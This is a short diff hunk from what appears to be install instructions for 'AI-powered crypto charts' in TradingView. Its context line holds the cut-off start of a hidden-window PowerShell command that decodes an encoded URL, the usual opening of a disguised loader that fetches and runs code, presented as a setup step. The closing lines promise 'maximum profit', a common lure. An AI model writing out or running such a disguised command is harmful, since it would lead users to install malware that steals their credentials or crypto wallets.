@@ -13,4 +13,5 @@ powershell -WindowStyle Hidden -Command "$url=[System.Text.Encoding]::UTF8.GetSt
 🔵 Step 4: Restart TradingView
 
 ✅ That’s it! You’re now ready to explore AI-powered crypto charts.
+
 📺 Follow along with the video to see how to use them for maximum profit.
